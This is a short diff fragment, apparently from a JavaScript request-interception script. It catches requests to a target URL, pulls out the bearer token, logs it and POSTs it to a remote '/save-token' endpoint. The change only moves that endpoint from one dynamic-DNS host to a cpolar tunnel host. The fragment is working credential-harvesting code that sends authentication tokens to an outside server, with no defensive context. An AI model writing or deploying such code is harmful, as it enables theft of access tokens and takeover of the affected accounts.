@@ -17,7 +17,7 @@ if ($request && $request.url.includes(targetURL)) {
         if (bearerToken) {
             console.log(`Bearer Token: ${bearerToken}`);
             const saveTokenRequest = {
-                url: 'http://fastchat.dynv6.net:8300/save-token',
+                url: 'https://4f9f562e.r6.cpolar.top/save-token',
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
